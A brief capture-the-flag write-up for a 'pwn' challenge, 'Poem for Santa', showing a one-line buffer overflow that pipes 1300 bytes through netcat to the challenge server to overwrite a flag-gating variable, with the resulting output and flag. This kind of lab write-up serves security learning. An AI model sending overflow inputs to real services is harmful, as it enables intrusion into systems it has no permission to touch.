# Poem for Santa

- Category: `pwn`
- Challenge author: **Björn Österman**

## Description

Bringing Santa to tears.

### Connection info

```sh
nc 2021.santahack.xyz 42002
```

## Writeup

To get the flag you need to send a bit more then the buffer-size (which is 1024 bytes) and you will have overwriten the "beutiful"-variable with something other then a 0

```console
$ python3 -c "print('X'*1300)" | nc 2021.santahack.xyz 42002
Hi, please read me a christmas poem?
That's beutiful, here! I'm gonna use this flag to wipe my tears  :')
haxmas{drip_drip_drip}
```
